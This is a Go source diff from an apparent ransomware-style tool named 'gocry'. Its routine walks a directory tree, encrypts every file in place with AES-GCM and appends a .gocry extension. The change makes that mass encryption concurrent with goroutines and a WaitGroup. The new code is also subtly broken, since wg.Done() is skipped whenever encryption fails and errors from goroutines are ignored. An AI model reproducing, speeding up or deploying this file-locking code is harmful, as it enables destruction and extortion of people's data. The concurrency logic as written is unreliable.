@@ -8,11 +8,12 @@ import (
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"sync"
 )
 
 // encryptSingleFile takes in a file path and a 32-bit random key and uses AES-GCM-256 encryption
 // to encrypt the file. It also adds the .gocry extension to the files.
-func encryptSingleFile(path string, key []byte) error {
+func encryptSingleFile(wg *sync.WaitGroup, path string, key []byte) error {
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
 		return err
@@ -37,6 +38,8 @@ func encryptSingleFile(path string, key []byte) error {
 		return err
 	}
 
+	wg.Done()
+
 	return nil
 }
 
@@ -44,6 +47,7 @@ func encryptSingleFile(path string, key []byte) error {
 // all of the subdirectories. It used to be a recursive function, but I think that filepath.Walk has
 // better performance.
 func EncryptRoot(startingPath string, key []byte) error {
+	var wg sync.WaitGroup
 	if err := filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
@@ -54,14 +58,15 @@ func EncryptRoot(startingPath string, key []byte) error {
 			return nil
 		}
 
-		if err := encryptSingleFile(path, key); err != nil {
-			return err
-		}
+		wg.Add(1)
+		go encryptSingleFile(&wg, path, key)
 
 		return nil
 	}); err != nil {
 		return err
 	}
+
+	wg.Wait()
 
 	return nil
 }
